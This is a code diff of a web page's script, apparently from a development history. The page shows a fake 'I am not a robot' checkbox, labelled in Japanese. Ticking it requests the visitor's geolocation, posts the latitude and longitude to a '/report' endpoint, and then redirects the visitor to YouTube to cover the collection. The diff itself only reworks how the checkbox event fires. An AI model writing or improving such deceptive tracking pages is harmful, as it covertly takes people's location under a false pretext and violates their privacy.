@@ -10,24 +10,26 @@
   <label for="check">私はロボットではありません</label>
 
   <script>
-    document.getElementById('check').addEventListener('change', () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(pos => {
-          fetch('/report', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude
-            })
-          }).then(() => {
-            window.location.href = "https://www.youtube.com/";
+    document.getElementById('check').addEventListener('click', (e) => {
+      if (e.target.checked) {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(pos => {
+            fetch('/report', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude
+              })
+            }).then(() => {
+              window.location.href = "https://www.youtube.com/";
+            });
+          }, err => {
+            alert('位置情報が取得できませんでした。');
           });
-        }, err => {
-          alert('位置情報が取得できませんでした。');
-        });
-      } else {
-        alert('このブラウザでは位置情報が使用できません。');
+        } else {
+          alert('このブラウザでは位置情報が使用できません。');
+        }
       }
     });
   </script>
